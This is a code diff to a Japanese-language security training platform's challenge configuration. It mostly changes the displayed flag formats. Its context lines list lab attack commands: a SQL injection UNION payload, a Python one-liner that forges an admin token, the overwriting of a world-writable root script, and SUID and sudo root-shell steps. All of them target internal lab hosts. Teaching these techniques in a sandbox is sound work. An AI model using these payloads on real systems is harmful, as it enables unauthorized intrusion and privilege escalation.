@@ -83,7 +83,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: '改ざん条件を満たした後、Target 1からセッション専用Flagを取得し、下の回答欄へ入力してください。',
         commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/api/flag"],
         hint: 'RESETすると攻略状態とFlagは初期化されます。他セッションのFlagはこの回答では使えません。',
-        result: 'Target 1が返した `TBX{target1_3e}` 形式のFlagを回答欄へ入力し、正解時だけCLEARになります。',
+        result: 'Target 1が返した `TBX{target1_**}` 形式のFlagを回答欄へ入力し、正解時だけCLEARになります。',
       },
       {
         id: '06', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target1-understand', stage: 'understand',
@@ -158,7 +158,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: 'IDORの変更操作を成功させた後、Target 2からセッション専用Flagを取得し、下の回答欄へ入力してください。',
         commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target2:3000/api/flag"],
         hint: 'FlagはTarget 2側でセッションごとに生成されます。フロントエンドのソースには固定Flagを置いていません。',
-        result: 'Target 2が返した `TBX{target2_...}` を回答欄へ入力し、正解時だけCLEARになります。',
+        result: 'Target 2が返した `TBX{target2_**}` 形式のFlagを回答欄へ入力し、正解時だけCLEARになります。',
       },
       {
         id: '06', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target2-understand', stage: 'understand',
@@ -205,7 +205,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: '通常の商品検索を確認した後、SQL Injection相当の入力で研修用データからFlagを取得してください。',
         commands: ["curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/search --data-urlencode 'q=apple'", "curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\"", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/flag"],
         hint: 'まず通常検索のJSONと、レスポンスに含まれる研修用SQL文字列を観察します。2本目では `training_secrets` が結果へ混入します。',
-        result: '検索結果またはFlag APIから `TBX{target3_...}` を取得し、回答欄へ入力します。',
+        result: '検索結果またはFlag APIから `TBX{target3_**}` を取得し、回答欄へ入力します。',
       },
       {
         id: '02', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target3-understand', stage: 'understand',
@@ -252,7 +252,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: '通常ログインで研修トークンを取得し、Base64URLのJSON内の `role` を `admin` に変えて管理者APIからFlagを取得してください。',
         commands: ["curl -s -X POST -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Content-Type: application/json' -d '{\"username\":\"student\",\"password\":\"portal123\"}' http://target4:3000/api/login", "python3 -c \"import base64,json; t=input('token: ').strip(); p=json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))); p['role']='admin'; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))\"", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Authorization: Bearer 変更後のトークン' http://target4:3000/api/admin"],
         hint: 'Target 4のトークンは署名付きJWTではなく、Base64URL化されたJSONだけです。nonceはセッションごとに変わるため、必ず自分のログインで取得したトークンを使います。',
-        result: '管理者APIのレスポンスに出た `TBX{target4_...}` を回答欄へ入力します。',
+        result: '管理者APIのレスポンスに出た `TBX{target4_**}` を回答欄へ入力します。',
       },
       {
         id: '02', title: 'UNDERSTAND: なぜ突破できたか', answerId: 'target4-understand', stage: 'understand',
@@ -300,7 +300,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: 'Target 1〜4で使った代表的な攻撃を試し、すべて防御されることを確認してから防御確認Flagを取得してください。',
         commands: ["curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/backup/config.json", "curl -s -X POST -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Content-Type: application/json' -d '{\"username\":\"student\",\"password\":\"secure123\"}' http://target5:3000/api/login", "curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/products/5002", "curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\"", "curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Authorization: Bearer 改変したトークン' http://target5:3000/api/admin", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/defense/status", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/flag"],
         hint: '商品IDの確認はログイン後に行います。トークン改変テストは、取得したJWTのpayloadを変えたり、任意の不正文字列を送れば防御チェックになります。',
-        result: '4つの防御チェックがtrueになった後、`TBX{secure_target_verified_...}` を回答欄へ入力します。',
+        result: '4つの防御チェックがtrueになった後、`TBX{target5_**}` を回答欄へ入力します。',
       },
       {
         id: '02', title: 'UNDERSTAND: 何を確認したか', answerId: 'target5-understand', stage: 'understand',
@@ -348,7 +348,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: 'Linux LabでKernel LPEの流れを観察し、実Kernel exploitを使わずに疑似root化してFlagを取得してください。',
         commands: ['uname -a', 'cat /home/student/copy-fail-notes.txt', 'cat /opt/copy-fail/README', '/opt/copy-fail/copy_fail_demo --explain', '/opt/copy-fail/copy_fail_demo --simulate', 'whoami', 'cat /root/flag.txt'],
         hint: 'Linux LabはSession IDごとの安全な疑似環境です。`--simulate` はCloud RunやKaliのKernelへ触れず、Copy Failによって権限チェックが壊れた結果だけを再現します。',
-        result: '`root@linux-lab:~#` 相当の状態になった後、`/root/flag.txt` の `FLAG{...}` を回答します。',
+        result: '`root@linux-lab:~#` 相当の状態になった後、`/root/flag.txt` の `TBX{target6_**}` を回答します。',
       },
       {
         id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target6-understand', stage: 'understand',
@@ -395,7 +395,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: 'owner / group / rwxを確認し、rootが実行するスクリプトが誰でも書き換え可能な危険性を体験してください。',
         commands: ['cat /home/student/permission-notes.txt', 'ls -l /opt/perm-lab/maintenance.sh', 'cat /opt/perm-lab/maintenance.sh', "printf 'id\\ncat /root/flag.txt\\n' > /opt/perm-lab/maintenance.sh", '/opt/perm-lab/run-maintenance', 'cat /root/flag.txt'],
         hint: '`-rwxrwxrwx` はowner/group/otherの全員が書き込み可能な状態です。rootが後で実行するファイルを書き換えられると、権限昇格につながります。',
-        result: 'Linux Lab内で疑似rootになった後、`/root/flag.txt` の `FLAG{...}` を回答します。',
+        result: 'Linux Lab内で疑似rootになった後、`/root/flag.txt` の `TBX{target7_**}` を回答します。',
       },
       {
         id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target7-understand', stage: 'understand',
@@ -442,7 +442,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: 'SUIDビットが付いたroot所有プログラムを見つけ、不適切な機能から疑似root化してFlagを取得してください。',
         commands: ['cat /home/student/suid-notes.txt', 'find / -perm -4000 -type f 2>/dev/null', 'ls -l /usr/local/bin/backup-viewer', '/usr/local/bin/backup-viewer --root-shell', 'id', 'cat /root/flag.txt'],
         hint: '`-rws` の `s` はSUIDを表します。root所有SUIDプログラムは、実行者がstudentでもroot権限で動く部分を持ちます。',
-        result: 'SUID helperの安全な疑似root化後、`/root/flag.txt` の `FLAG{...}` を回答します。',
+        result: 'SUID helperの安全な疑似root化後、`/root/flag.txt` の `TBX{target8_**}` を回答します。',
       },
       {
         id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target8-understand', stage: 'understand',
@@ -489,7 +489,7 @@ const challengeGroups: ChallengeGroup[] = [
         goal: '`sudo -l` で許可された操作を確認し、過剰なsudoers設定から疑似root化してFlagを取得してください。',
         commands: ['cat /home/student/sudo-notes.txt', 'sudo -l', 'sudo /usr/local/bin/log-viewer --root-shell', 'whoami', 'cat /root/flag.txt'],
         hint: '`sudo -l` は現在のユーザーがsudoで実行できるコマンドを表示します。NOPASSWDで危険な機能を許すと権限昇格になります。',
-        result: 'sudoers設定ミスの疑似root化後、`/root/flag.txt` の `FLAG{...}` を回答します。',
+        result: 'sudoers設定ミスの疑似root化後、`/root/flag.txt` の `TBX{target9_**}` を回答します。',
       },
       {
         id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target9-understand', stage: 'understand',
